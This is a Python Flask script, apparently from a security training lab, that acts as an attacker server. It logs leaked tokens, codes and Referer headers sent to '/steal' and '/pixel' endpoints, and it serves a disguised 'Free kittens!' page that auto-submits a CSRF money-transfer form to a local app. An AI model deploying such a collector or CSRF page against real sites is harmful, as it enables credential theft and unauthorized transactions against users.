"""M03 in-range attacker host - captures leaked codes/tokens/Referers and hosts
CSRF proof pages. Only ever receives traffic from the lab itself.
"""
import time

from flask import Flask, jsonify, request

app = Flask(__name__)
LOG = []


def _capture():
    LOG.append({"ts": time.time(), "path": request.path,
                "query": request.query_string.decode(),
                "referer": request.headers.get("Referer", "")})
    return "ok"


@app.get("/health")
def health():
    return "ok"


@app.get("/steal")
def steal():
    return _capture()


@app.get("/pixel")
def pixel():
    _capture()
    return b"GIF89a", 200, {"Content-Type": "image/gif"}


@app.get("/offers")
def offers():
    return _capture()


@app.get("/logs")
def logs():
    return jsonify(LOG)


@app.post("/clear")
def clear():
    LOG.clear()
    return jsonify({"ok": True})


@app.get("/csrf")
def csrf():
    return """<html><body>
<h1>Free kittens!</h1>
<form id="f" method="POST" action="http://127.0.0.1:8300/transfer">
  <input type="hidden" name="to" value="bob">
  <input type="hidden" name="amount" value="50">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)